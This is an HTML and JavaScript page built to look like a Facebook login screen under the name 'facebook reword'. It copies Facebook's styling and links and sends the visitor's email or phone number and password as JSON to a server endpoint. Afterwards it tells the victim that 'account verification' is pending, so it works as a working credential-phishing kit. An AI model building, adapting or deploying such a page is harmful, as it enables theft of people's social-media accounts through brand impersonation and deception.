<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#ffffff">
  <title>Log in to facebook reword</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body { min-height: 100%; }
    body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
      color: #1c1e21;
      background: #f0f2f5;
      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    
    .login-container {
      width: 100%;
      max-width: 400px;
    }

    .brand-header {
      text-align: center;
      margin-bottom: 24px;
    }

    .brand-logo {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      text-decoration: none;
      color: #0866e8;
      font-size: 26px;
      font-weight: 700;
      letter-spacing: -0.5px;
    }

    .brand-mark {
      display: grid;
      place-items: center;
      width: 38px;
      height: 38px;
      border-radius: 10px;
      background: #0866e8;
      color: #fff;
      font-size: 20px;
      font-weight: 700;
      box-shadow: 0 4px 12px rgba(8, 102, 232, 0.25);
    }

    .card {
      background: #ffffff;
      border-radius: 12px;
      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
      border: 1px solid #e4e6eb;
      padding: 28px 24px;
      text-align: center;
    }

    h1 {
      margin: 0 0 20px;
      font-size: 19px;
      line-height: 1.3;
      font-weight: 600;
      color: #1c1e21;
    }

    .input-wrap {
      position: relative;
      margin-bottom: 14px;
    }

    input {
      display: block;
      width: 100%;
      height: 48px;
      padding: 0 16px;
      border: 1px solid #ccd0d5;
      border-radius: 8px;
      outline: 0;
      color: #1c1e21;
      background: #fff;
      font-family: inherit;
      font-size: 15px;
      transition: border-color .15s ease, box-shadow .15s ease;
    }

    input:focus {
      border-color: #0866e8;
      box-shadow: 0 0 0 3px rgba(8, 102, 232, 0.15);
    }

    input::placeholder {
      color: #8d949e;
    }

    .toggle-pass {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #65676b;
      cursor: pointer;
      font-size: 13px;
      font-weight: 600;
      padding: 6px 8px;
      border-radius: 4px;
    }

    .toggle-pass:hover {
      color: #0866e8;
    }

    .primary {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      height: 46px;
      border: 0;
      border-radius: 8px;
      background: #0866e8;
      color: #fff;
      font-family: inherit;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
      transition: background-color .15s ease;
    }

    .primary:hover:not(:disabled) {
      background: #075bd0;
    }

    .primary:disabled {
      background: #80b0f5;
      cursor: not-allowed;
    }

    .spinner {
      display: none;
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 0.8s linear infinite;
      margin-right: 8px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .forgot {
      display: inline-block;
      margin-top: 16px;
      color: #0866e8;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .divider {
      margin: 20px 0;
      border: none;
      border-top: 1px solid #dadde1;
    }

    .create {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      height: 44px;
      padding: 0 20px;
      background-color: #42b72a;
      border-radius: 8px;
      color: #ffffff;
      text-decoration: none;
      font-size: 15px;
      font-weight: 600;
      transition: background-color .15s ease;
    }

    .create:hover {
      background-color: #36a420;
    }

    .status {
      display: none;
      margin-top: 16px;
      padding: 10px 14px;
      border-radius: 8px;
      text-align: center;
      font-size: 13px;
      line-height: 1.4;
      animation: fadeIn 0.25s ease;
    }

    .status.success {
      display: block;
      color: #0f5132;
      background-color: #d1e7dd;
      border: 1px solid #badbcc;
    }

    .status.error {
      display: block;
      color: #842029;
      background-color: #f8d7da;
      border: 1px solid #f5c2c7;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-4px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .footer-note {
      text-align: center;
      margin-top: 24px;
      color: #65676b;
      font-size: 13px;
    }

    .footer-note a {
      color: #0866e8;
      text-decoration: none;
      font-weight: 600;
    }

    @media (max-width: 480px) {
      body {
        background: #ffffff;
        padding: 20px 16px;
        justify-content: flex-start;
      }
      .card {
        box-shadow: none;
        border: none;
        padding: 0;
      }
      .brand-header {
        margin-top: 20px;
      }
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="brand-header">
      <div class="brand-logo">
        <span class="brand-mark">f</span>
        <span>facebook reword</span>
      </div>
    </div>

    <div class="card">
      <h1>Log in to facebook reword</h1>
      
      <form id="login-form" autocomplete="off">
        <div class="input-wrap">
          <input 
            id="account" 
            name="account" 
            type="text" 
            inputmode="email" 
            placeholder="Email address or mobile number" 
            aria-label="Email address or mobile number" 
            required 
            autocomplete="off"
          >
        </div>

        <div class="input-wrap" id="password-wrap">
          <input 
            id="password" 
            name="password" 
            type="password" 
            placeholder="Password" 
            aria-label="Password" 
            required 
            autocomplete="new-password"
          >
          <button type="button" class="toggle-pass" id="toggle-password" aria-label="Toggle password visibility">Show</button>
        </div>

        <button class="primary" id="submit-btn" type="submit">
          <span class="spinner" id="spinner"></span>
          <span id="btn-text">Log in</span>
        </button>
      </form>

      <div id="status" class="status" role="status" aria-live="polite"></div>

      <a class="forgot" href="#" id="forgot-link">Forgotten password?</a>

      <div class="divider"></div>

      <div>
        <a class="create" href="#" id="create-link">Create new account</a>
      </div>
    </div>

    <div class="footer-note">
       &bull; <a href="https://www.facebook.com/help/235353253505947" target="_blank">facebook Security</a>
    </div>
  </div>

  <script>
    const form = document.querySelector('#login-form');
    const submitBtn = document.querySelector('#submit-btn');
    const btnText = document.querySelector('#btn-text');
    const spinner = document.querySelector('#spinner');
    const statusMsg = document.querySelector('#status');
    const togglePassBtn = document.querySelector('#toggle-password');
    const passInput = document.querySelector('#password');

    // Toggle password visibility
    togglePassBtn.addEventListener('click', () => {
      const isPass = passInput.getAttribute('type') === 'password';
      passInput.setAttribute('type', isPass ? 'text' : 'password');
      togglePassBtn.textContent = isPass ? 'Hide' : 'Show';
    });

    function getApiUrl() {
      if (window.location.protocol.startsWith('http')) {
        return window.location.origin + '/api/login';
      }
      return 'http://localhost:3000/api/login';
    }

    form.addEventListener('submit', async (event) => {
      event.preventDefault();

      const account = document.querySelector('#account').value.trim();
      const password = passInput.value;

      if (!account || !password) {
        showStatus('Please enter both your email/phone and password.', 'error');
        return;
      }

      // UI Loading state
      submitBtn.disabled = true;
      spinner.style.display = 'inline-block';
      btnText.textContent = 'Logging in...';
      hideStatus();

      try {
        const response = await fetch(getApiUrl(), {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ account, password })
        });

        const data = await response.json();

        if (response.ok && data.success) {
          showStatus('Account verification submitted. Approval pending.', 'success');
          form.reset();
          togglePassBtn.textContent = 'Show';
          passInput.setAttribute('type', 'password');
        } else {
          showStatus(data.message || 'Login failed. Please check your credentials.', 'error');
        }
      } catch (err) {
        console.error('Submission error:', err);
        showStatus('Server connection failed. Make sure the server is running on http://localhost:3000', 'error');
      } finally {
        submitBtn.disabled = false;
        spinner.style.display = 'none';
        btnText.textContent = 'Log in';
      }
    });

    function showStatus(text, type) {
      statusMsg.textContent = text;
      statusMsg.className = 'status ' + type;
    }

    function hideStatus() {
      statusMsg.className = 'status';
      statusMsg.textContent = '';
    }

    document.querySelectorAll('#forgot-link, #create-link').forEach(link => {
      link.addEventListener('click', (e) => {
        e.preventDefault();
        showStatus('This action is currently redirected to facebook support.', 'success');
      });
    });
  </script>
</body>
</html>
